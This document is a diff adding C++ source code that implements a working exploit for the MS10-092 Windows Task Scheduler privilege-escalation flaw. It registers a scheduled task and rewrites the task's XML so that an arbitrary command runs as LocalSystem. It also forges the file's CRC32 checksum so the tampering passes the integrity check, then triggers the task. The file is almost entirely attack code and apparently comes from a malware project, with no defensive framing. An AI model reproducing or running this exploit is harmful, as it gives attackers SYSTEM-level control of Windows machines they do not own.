@@ -1,0 +1,228 @@
+#include <windows.h>
+#include <shlwapi.h>
+#include <shlobj.h>
+#include <comdef.h>
+#include <taskschd.h>
+#include <initguid.h>
+#include <ole2.h>
+#include <mstask.h>
+#include <msterr.h>
+#include <objidl.h>
+
+#pragma comment(lib,"taskschd.lib")
+//#pragma comment(lib,"comsupp.lib")
+//#pragma comment(lib,"imagehlp.lib")
+
+#include "ntdll.h"
+#include "Utils.h"
+#include "Memory.h"
+#include "Strings.h"
+
+
+
+VOID WINAPI _com_issue_error(HRESULT){}
+
+WCHAR ExpFmt[] = 
+{
+	L"  <Principals>\r\n"\
+	L"    <Principal id=\"LocalSystem\">\r\n"\
+	L"      <UserId>S-1-5-18</UserId>\r\n"\
+	L"      <RunLevel>HighestAvailable</RunLevel>\r\n"\
+	L"    </Principal>\r\n"\
+	L"  </Principals>\r\n"\
+	L"  <Actions Context=\"LocalSystem\">\r\n"\
+	L"    <Exec>\r\n"\
+	L"      <Command>%S</Command>\r\n"\
+	L"    </Exec>\r\n"\
+	L"  </Actions>\r\n"\
+	L"</Task>"
+};
+
+WCHAR wszComment[] = L"\r\n<!--\0\0-->\r\n";
+
+extern"C" __declspec(dllimport)  DWORD NTAPI RtlComputeCrc32 ( DWORD  dwInitial, const BYTE* pData,INT iLen);
+
+BOOL BypassUACTaskSchChangeXML(LPWSTR wszTaskPath,PCHAR lpPath)
+{
+	BOOL bRet = FALSE;
+	HANDLE hFile;
+	DWORD t;
+	
+	hFile = (HANDLE)CreateFileW(wszTaskPath,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		DWORD dwSize = (DWORD)GetFileSize(hFile,NULL);
+		if (dwSize)
+		{
+			DWORD AppendSize = lstrlenA(lpPath)*2 + sizeof(ExpFmt) + sizeof(wszComment);
+			PWCHAR Buffer = (PWCHAR)MemAlloc(dwSize + AppendSize);
+			if (Buffer)
+			{
+				if (ReadFile(hFile,Buffer,dwSize,&t,NULL))
+				{
+					DWORD dwReadCrc32 = ~(DWORD)RtlComputeCrc32(0,(PUCHAR)Buffer+2,dwSize-2);
+					
+					PWCHAR lpwszAppendix = (PWCHAR)MemAlloc(AppendSize);
+					if (lpwszAppendix)
+					{
+						AppendSize =(DWORD) wvsprintfW(lpwszAppendix,ExpFmt,(va_list)lpPath)*2;
+						PWCHAR lpwszActions = (PWCHAR)m_wcsstr(Buffer, L"<Actions ");
+
+						if (lpwszActions)
+						{
+							m_memcpy(lpwszActions,lpwszAppendix,AppendSize);
+							dwSize = (DWORD)lpwszActions - (DWORD)Buffer + AppendSize;
+							m_memcpy((PUCHAR)Buffer + dwSize,wszComment,sizeof(wszComment)-2);
+
+							DWORD Count = dwSize + 10;
+							dwSize += sizeof(wszComment)-2;
+							
+							LONG dwNewCrc32 = dwReadCrc32 ^ ~(DWORD)RtlComputeCrc32(0,(PUCHAR)Buffer+2,dwSize-2);
+							Count = 8 * (dwSize-2 - Count);
+							while (Count)
+							{
+								Count--;
+								if (dwNewCrc32 >= 0) dwNewCrc32 *= 2; else dwNewCrc32 = 2 * dwNewCrc32 ^ 0xDB710641;
+							}
+
+							*(PLONG)((PUCHAR)Buffer + dwSize - sizeof(L"-->\r\n")-2) = dwNewCrc32;
+
+							SetFilePointer(hFile,0,0,FILE_BEGIN);
+
+							if (WriteFile(hFile,Buffer,dwSize,&t,NULL))
+							{
+								bRet = TRUE;
+								SetFilePointer(hFile,0,0,FILE_END);
+							}
+						}
+
+						MemFree(lpwszAppendix);
+					}
+				}
+
+				MemFree(Buffer);
+			}
+		}
+
+		CloseHandle(hFile);
+	}
+
+
+	return bRet;
+}
+
+BOOL ExploitMS10_092(PCHAR lpPath)
+{
+	BOOL bRet = FALSE;
+	HRESULT Hr;
+
+	Hr = (HRESULT)CoInitializeEx(NULL,COINIT_MULTITHREADED);
+	if (SUCCEEDED(Hr))
+	{	
+		Hr =(HRESULT)CoInitializeSecurity(NULL,-1,NULL,NULL,RPC_C_AUTHN_LEVEL_PKT_PRIVACY,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,0,NULL);
+		if (SUCCEEDED(Hr))
+		{
+			ITaskService *Service = NULL;
+
+			Hr = (HRESULT)CoCreateInstance(CLSID_TaskScheduler,NULL,CLSCTX_INPROC_SERVER,IID_ITaskService,(PVOID*)&Service);  
+			if (SUCCEEDED(Hr))
+			{
+				Hr = Service->Connect(_variant_t(),_variant_t(),_variant_t(),_variant_t());
+				if (SUCCEEDED(Hr))
+				{
+					ITaskFolder *RootFolder;
+
+					Hr = Service->GetFolder(BSTR(L"\\"),&RootFolder);
+					if (SUCCEEDED(Hr))
+					{
+						WCHAR wszTaskPath[MAX_PATH]={0};
+
+						wvsprintfW(wszTaskPath,L"\\\\?\\GlobalRoot\\SystemRoot\\System32\\Tasks\\%x",(va_list)(GetTickCount()^GetCurrentProcessId()));
+						LPWSTR wszTaskName = (LPWSTR)PathFindFileNameW(wszTaskPath);
+						RootFolder->DeleteTask(BSTR(wszTaskName),0);
+
+						ITaskDefinition *pTask;
+					
+						Hr = Service->NewTask(0,&pTask);
+						if (SUCCEEDED(Hr))
+						{
+							IActionCollection *pActionCollection;
+
+							Hr = pTask->get_Actions(&pActionCollection);
+							if (SUCCEEDED(Hr))
+							{
+								IAction *pAction = NULL;
+
+								Hr = pActionCollection->Create(TASK_ACTION_EXEC,&pAction);
+								if (SUCCEEDED(Hr))
+								{
+									IExecAction *pExecAction;
+
+									Hr = pAction->QueryInterface(IID_IExecAction,(PVOID*)&pExecAction);
+									if (SUCCEEDED(Hr))
+									{                                                                 
+										Hr = pExecAction->put_Path(BSTR(L"cmd.exe"));
+										if (SUCCEEDED(Hr))
+										{
+											Hr = pExecAction->put_Arguments(BSTR(L""));
+											if (SUCCEEDED(Hr))
+											{
+												IRegisteredTask	*RegisteredTask;
+												
+												Hr = RootFolder->RegisterTaskDefinition(BSTR(wszTaskName),pTask,TASK_CREATE_OR_UPDATE,_variant_t(),_variant_t(),TASK_LOGON_INTERACTIVE_TOKEN,_variant_t(L""),&RegisteredTask);
+												if (SUCCEEDED(Hr))
+												{
+													if (BypassUACTaskSchChangeXML(wszTaskPath,lpPath))
+													{
+														
+														Hr = RegisteredTask->put_Enabled(VARIANT_FALSE);
+														if (SUCCEEDED(Hr))                      
+														{
+															Hr = RegisteredTask->put_Enabled(VARIANT_TRUE);
+															if (SUCCEEDED(Hr))
+															{
+																VARIANT vr = {0};
+																vr.vt = VT_EMPTY;                                  
+																
+																Hr = RegisteredTask->Run(vr,NULL);
+																if (SUCCEEDED(Hr)) 
+																{
+																	bRet = TRUE;
+																}
+															}
+														}			
+													}
+
+													RegisteredTask->Release();
+												}
+											}
+										}
+											
+										pExecAction->Release();
+									}
+
+									pAction->Release();
+								}
+
+								pActionCollection->Release();
+							}
+							
+							pTask->Release();
+						}
+
+						if (!bRet) RootFolder->DeleteTask(_bstr_t(wszTaskName),0);
+					
+						RootFolder->Release();
+					}
+				}
+		
+				Service->Release();
+			}
+
+		}
+		
+		CoUninitialize();
+	}
+
+	return bRet;
+}
